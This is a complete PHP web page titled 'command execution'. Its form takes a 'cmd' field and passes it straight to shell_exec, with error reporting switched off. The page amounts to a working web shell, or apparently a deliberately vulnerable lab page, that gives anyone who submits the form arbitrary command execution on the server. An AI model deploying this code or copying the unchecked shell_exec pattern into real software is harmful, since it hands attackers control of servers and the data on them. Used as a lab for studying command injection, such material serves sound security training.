<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>命令执行</title>
    <script src="JS/jquery.min.js"></script>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <script src="bootstrap/js/bootstrap.min.js"></script>
	<style>
	body
	{
		width:500px;
		margin:0 auto;
	}
	</style>
</head>

<body>
<?php
error_reporting(0);

echo(shell_exec($_POST[cmd]));

?>
	<br><br><br><br><br><br>
	<div class="panel panel-primary">
	  <div class="panel-heading">
		<h3 class="panel-title">命令执行</h3>
	  </div>
	  <div class="panel-body">
	  <br><br>

		<form method='post'>
                <div class="input-group">
                    <input type="text" class="form-control"  placeholder="..." name="cmd">
                    <span class="input-group-btn">
					<button class="btn btn-default" type="submit">发送</button>
				  </span>
                </div>
		</form>
	  </div>
	</div>


</body>



